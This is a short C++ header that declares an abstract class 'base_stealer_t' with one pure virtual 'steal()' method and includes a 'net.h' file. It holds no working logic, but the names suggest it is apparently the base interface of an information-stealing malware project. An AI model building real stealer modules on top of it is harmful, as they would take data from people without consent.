#ifndef BASE_STEELER_T_H
#define BASE_STEELER_T_H

#include <future>
#include "net.h"

class base_stealer_t
{
public:
    base_stealer_t() = default;
    virtual ~base_stealer_t() = default;

    virtual std::future<std::string> steal() = 0;
};



#endif //BASE_STEELER_T_H
